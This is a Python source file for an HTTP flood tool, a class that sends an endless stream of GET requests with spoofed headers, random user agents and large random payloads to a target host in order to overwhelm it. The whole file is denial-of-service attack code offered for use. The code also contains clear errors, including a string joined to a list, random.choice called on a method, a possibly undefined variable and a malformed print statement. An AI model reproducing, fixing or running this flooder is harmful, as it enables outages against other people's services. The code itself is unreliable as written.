#       Copyright (c) 2020, Zenqi. All rights reserved. 
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.


import socket
import requests
import random
from fake_useragent import UserAgent, FakeUserAgentError


class HTTPFlood(object):
    def __init__(self, host=None):
        if host == None:
            print("Please specify host")

        self.host = f"http://{host}"

    def isCloudfare(self):
        return False

    def user_agent(self):
        try:
            ua = UserAgent()
        except FakeUserAgentError:
            pass

        for i in range(100):
            user_agent = ua.random

        return user_agent

    def create_payload(self):
        random_str = [chr(i) for i in range(10)]
        header = {
            'Cache-Control': 'no-cache',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
		    'Referer': 'http://www.google.com/?q=' + [string for string in random_str] ,
		    'Keep-Alive': str(random.randint(110,120)),
		    'Connection': 'keep-alive',
            "User-Agent": random.choice(self.user_agent),

        }

        return header

    def send_payload(self):
        sent = 0
        payload = random._urandom(random.randint(1, 99999999))
        if self.isCloudfare() != True:
            while True:
                try:
                    request = requests.get(self.host, params=payload, headers=self.create_payload())
                except Exception as e:
                    print(e)
                    continue
                else:
                    sent += 1
                    print("Sending %s requests per second", end="\r" % (sent))


    
        
